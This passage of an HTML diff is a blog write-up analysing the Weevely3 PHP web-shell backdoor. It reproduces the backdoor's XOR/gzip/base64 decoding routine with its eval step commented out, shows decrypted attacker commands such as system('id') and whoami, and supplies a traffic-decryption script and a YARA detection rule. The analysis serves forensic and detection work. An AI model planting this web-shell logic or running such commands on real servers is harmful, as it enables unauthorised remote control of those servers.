+<span class="nv">$kh</span> <span class="o">=</span> <span class="s2">"11a12a4a68f2"</span><span class="p">;</span> <span class="c1">// SECOND PART: 12 next chars</span>
+<span class="nv">$kf</span> <span class="o">=</span> <span class="s2">"120bb3b9572c"</span><span class="p">;</span> <span class="c1">// THIRD PART: 12 last chars</span>
+<span class="nv">$p</span> <span class="o">=</span> <span class="s2">"1DGp1Y6lWKI3pJ2P"</span><span class="p">;</span> <span class="c1">// Random data (?)</span>
+
+<span class="k">function</span> <span class="nf">x</span><span class="p">(</span><span class="nv">$t</span><span class="p">,</span> <span class="nv">$k</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// XOR</span>
+    <span class="nv">$c</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$k</span><span class="p">);</span>
+    <span class="nv">$l</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$t</span><span class="p">);</span>
+    <span class="nv">$o</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$l</span><span class="p">;)</span> <span class="p">{</span>
+        <span class="k">for</span> <span class="p">(</span><span class="nv">$j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">(</span><span class="nv">$j</span> <span class="o">&lt;</span> <span class="nv">$c</span> <span class="o">&amp;&amp;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$l</span><span class="p">);</span> <span class="nv">$j</span><span class="o">++</span><span class="p">,</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+              <span class="nv">$o</span><span class="o">.=</span><span class="nv">$t</span><span class="p">{</span><span class="nv">$i</span><span class="p">}</span><span class="o">^</span><span class="nv">$k</span><span class="p">{</span><span class="nv">$j</span><span class="p">};</span>
+            <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nv">$o</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="nv">$phpinput</span> <span class="o">=</span> <span class="s2">".XJ_Aaf.Yzk+W,so11a12a4a68f2Gqx5ev6t4ATRBAeG5NExNHoRMQo120bb3b9572cI.O5V</span><span class="se">\$</span><span class="s2">bDA2*7A!fm"</span><span class="p">;</span> <span class="c1">// HTTP POST data</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/</span><span class="nv">$kh</span><span class="s2">(.+)</span><span class="nv">$kf</span><span class="s2">/"</span><span class="p">,</span> <span class="nv">$phpinput</span><span class="p">,</span> <span class="nv">$m</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// if $kh and $kf exist in php://input, store matches in array $m; if debugged with print_r($m) you will notice that $m[0] is $kh + b64data + $kf and $m[1] is b64data only</span>
+
+    <span class="nv">$phpcode</span> <span class="o">=</span> <span class="o">@</span><span class="nb">gzuncompress</span><span class="p">(</span><span class="o">@</span><span class="nx">x</span><span class="p">(</span><span class="o">@</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$m</span><span class="p">[</span><span class="mi">1</span><span class="p">]),</span> <span class="nv">$k</span><span class="p">));</span> <span class="c1">// gunzip(XOR(b64decode(data), key))</span>
+    <span class="k">print</span><span class="p">(</span><span class="nv">$phpcode</span><span class="p">);</span>
+
+<span class="cm">/*
+    @ob_start(); // Turn on output buffering
+    @eval($phpcode); // Executes PHP code
+    $o = @ob_get_contents(); // Save stdout to $o
+    @ob_end_clean(); // Clean (erase) the output buffer and turn off output buffering
+
+    $r = @base64_encode(@x(@gzcompress($o), $k)); // b64encode(XOR(gzip(stdout)), key)
+
+    print("$p$kh$r$kf"); // HTTP Response data
+*/</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span></code></pre></figure>
+
+<p>Always take care of special characters such as the dollar sign in this input. Executing the above PHP code outputs:</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">echo(69549);</span></code></pre></figure>
+
+<p>This might seem confusing at first but it makes sense, the tool makes a <a href="https://github.com/epinna/weevely3/blob/master/modules/shell/php.py#L38">web-based check</a> to ensure a proper connection end-point. If you decrypt the second packet, you get another validation check:</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">@error_reporting(0);</span>@system<span class="o">(</span><span class="s1">'echo 17236'</span><span class="o">)</span><span class="p">;</span></code></pre></figure>
+
+<p>But this time, it ensures that is has necessary privileges to execute system commands on the victim server. Moreover, there are three more default packets which retrieve:</p>
+<ul>
+  <li>Hostname</li>
+  <li>Username</li>
+  <li>Current working directory</li>
+</ul>
+
+<p>In short, the five above requests are always sent immediately after initiating a backdoor communication channel. Decrypting the sixth request actually gives us the commander that the attacker wrote:</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">chdir('/var/www/html');</span>@error_reporting<span class="o">(</span>0<span class="o">)</span><span class="p">;</span>@system<span class="o">(</span><span class="s1">'id 2&gt;&amp;1'</span><span class="o">)</span><span class="p">;</span></code></pre></figure>
+
+<p>Functions such as <code class="language-plaintext highlighter-rouge">chdir()</code>, <code class="language-plaintext highlighter-rouge">error_reporting()</code>, and <code class="language-plaintext highlighter-rouge">system()</code> are always used; meanwhile the <code class="language-plaintext highlighter-rouge">2&gt;&amp;1</code> idiom is automatically appended after each user-entered command.</p>
+
+<h1 id="5-automation">5. Automation</h1>
+
+<p>I refined a script to decrypt content given as an input parameter to the script in CLI:</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="nv">$k</span> <span class="o">=</span> <span class="s2">"b0270e74"</span><span class="p">;</span>
+<span class="nv">$kh</span> <span class="o">=</span> <span class="s2">"11a12a4a68f2"</span><span class="p">;</span>
+<span class="nv">$kf</span> <span class="o">=</span> <span class="s2">"120bb3b9572c"</span><span class="p">;</span>
+
+<span class="k">echo</span> <span class="nx">decrypt</span><span class="p">(</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="nv">$k</span><span class="p">,</span><span class="nv">$kh</span><span class="p">,</span><span class="nv">$kf</span><span class="p">);</span>
+
+<span class="k">function</span> <span class="nf">decrypt</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span><span class="nv">$k</span><span class="p">,</span><span class="nv">$kh</span><span class="p">,</span><span class="nv">$kf</span><span class="p">){</span>
+    <span class="nv">$data</span> <span class="o">=</span> <span class="nx">peel</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span><span class="nv">$kh</span><span class="p">,</span><span class="nv">$kf</span><span class="p">);</span>
+	
+    <span class="nv">$first</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+    <span class="nv">$second</span> <span class="o">=</span> <span class="nx">x</span><span class="p">(</span><span class="nv">$first</span><span class="p">,</span><span class="nv">$k</span><span class="p">);</span>
+    <span class="nv">$third</span> <span class="o">=</span> <span class="nb">gzuncompress</span><span class="p">(</span><span class="nv">$second</span><span class="p">);</span>
+    <span class="k">return</span> <span class="nv">$third</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="nf">peel</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span><span class="nv">$kh</span><span class="p">,</span><span class="nv">$kf</span><span class="p">){</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/</span><span class="nv">$kh</span><span class="s2">(.+)</span><span class="nv">$kf</span><span class="s2">/"</span><span class="p">,</span> <span class="nv">$data</span><span class="p">,</span> <span class="nv">$m</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="nv">$m</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+		<span class="k">exit</span><span class="p">(</span><span class="s2">"[*] Input does not match for decryption!"</span><span class="p">);</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="nf">x</span><span class="p">(</span><span class="nv">$t</span><span class="p">,</span> <span class="nv">$k</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$c</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$k</span><span class="p">);</span>
+    <span class="nv">$l</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$t</span><span class="p">);</span>
+    <span class="nv">$o</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$l</span><span class="p">;)</span> <span class="p">{</span>
+        <span class="k">for</span> <span class="p">(</span><span class="nv">$j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">(</span><span class="nv">$j</span> <span class="o">&lt;</span> <span class="nv">$c</span> <span class="o">&amp;&amp;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$l</span><span class="p">);</span> <span class="nv">$j</span><span class="o">++</span><span class="p">,</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+              <span class="nv">$o</span><span class="o">.=</span><span class="nv">$t</span><span class="p">{</span><span class="nv">$i</span><span class="p">}</span><span class="o">^</span><span class="nv">$k</span><span class="p">{</span><span class="nv">$j</span><span class="p">};</span>
+            <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nv">$o</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span></code></pre></figure>
+
+<p>Usage:</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>php decrypt.php <span class="s2">".XJ_Aaf.Yzk+W,so11a12a4a68f2Gqx5+XisG+Yy5x18HLcYG03n/R/5qGbj1kZ6GhqvGL5Neh//H0/++CnnAje6cGAi9ZTUXZjyUNBF1lQdKLyeLWClMDcgpSFr120bb3b9572cI.O5V</span><span class="se">\$</span><span class="s2">bDA2*7A</span><span class="se">\!</span><span class="s2">fm"</span>
+<span class="go">
+</span><span class="gp">chdir('/var/www/html');</span>@error_reporting<span class="o">(</span>0<span class="o">)</span><span class="p">;</span>@system<span class="o">(</span><span class="s1">'whoami 2&gt;&amp;1'</span><span class="o">)</span><span class="p">;</span></code></pre></figure>
+
+<h1 id="6-yara-rule">6. YARA Rule</h1>
+
+<p>While generating a new backdoor creates different assembling variable names and function orders, one detail that I have noticed is that the core deobfuscated core code remains the same. Its artifacts such as MD5 hash components (<code class="language-plaintext highlighter-rouge">$k</code>, <code class="language-plaintext highlighter-rouge">$kh</code>, and <code class="language-plaintext highlighter-rouge">$kf</code>) never change names or formats, only values; all of their static presence, including a <code class="language-plaintext highlighter-rouge">str_replace()</code> function as per its Python logic, denote that the script is a Weevely backdoor:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">rule</span> <span class="n">weevely3_backdoor</span> 
+<span class="p">{</span>
+	<span class="nl">meta:</span>
+		<span class="n">author</span> <span class="o">=</span> <span class="s">"Arti Karahoda"</span>
+		<span class="n">description</span> <span class="o">=</span> <span class="s">"Weevely3 - Weaponized Web Shell"</span>
+		<span class="n">reference</span> <span class="o">=</span> <span class="s">"https://artikrh.github.io/posts/weevely-backdoor-analysis"</span>
+		<span class="n">confidence</span> <span class="o">=</span> <span class="s">"high"</span>
+		<span class="n">last_updated</span> <span class="o">=</span> <span class="s">"30/03/2020"</span>
+	<span class="nl">strings:</span>
+		<span class="err">$</span><span class="n">php</span> <span class="o">=</span> <span class="s">"&lt;?php"</span> <span class="n">ascii</span>
+		<span class="err">$</span><span class="n">rf1</span> <span class="o">=</span> <span class="s">"$k"</span> <span class="n">ascii</span>
+		<span class="err">$</span><span class="n">rf2</span> <span class="o">=</span> <span class="s">"$kh"</span> <span class="n">ascii</span>
+		<span class="err">$</span><span class="n">rf3</span> <span class="o">=</span> <span class="s">"$kf"</span> <span class="n">ascii</span>
+		<span class="err">$</span><span class="n">rf4</span> <span class="o">=</span> <span class="s">"$p"</span> <span class="n">ascii</span>
+		<span class="err">$</span><span class="n">rf5</span> <span class="o">=</span> <span class="s">"$o"</span> <span class="n">ascii</span>
+		<span class="err">$</span><span class="n">rf6</span> <span class="o">=</span> <span class="o">/</span><span class="err">\$\</span><span class="n">w</span><span class="p">{</span><span class="mi">1</span><span class="p">,</span><span class="mi">4</span><span class="p">}</span><span class="o">=</span><span class="n">str_replace</span><span class="err">\</span><span class="p">(</span><span class="err">'\</span><span class="n">w</span><span class="p">{</span><span class="mi">1</span><span class="p">,}</span><span class="sc">','','</span><span class="o">/</span> <span class="n">ascii</span>
+	<span class="nl">condition:</span>
+		<span class="err">$</span><span class="n">php</span> <span class="n">at</span> <span class="mi">0</span> <span class="n">and</span> <span class="n">all</span> <span class="n">of</span> <span class="p">(</span><span class="err">$</span><span class="n">rf</span><span class="o">*</span><span class="p">)</span> <span class="n">and</span> <span class="n">filesize</span> <span class="o">&gt;</span> <span class="mi">500</span> <span class="n">and</span> <span class="n">filesize</span> <span class="o">&lt;</span> <span class="mi">1000</span>
+<span class="p">}</span></code></pre></figure>
+
+<p><i><a href="../">Go back to homepage</a></i></p>
+
+
+      </section>
+    </div>
+
+    
+      <script>
+        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-151966598-1', 'auto');
+        ga('send', 'pageview');
+      </script>
+    
+  </body>
+</html>
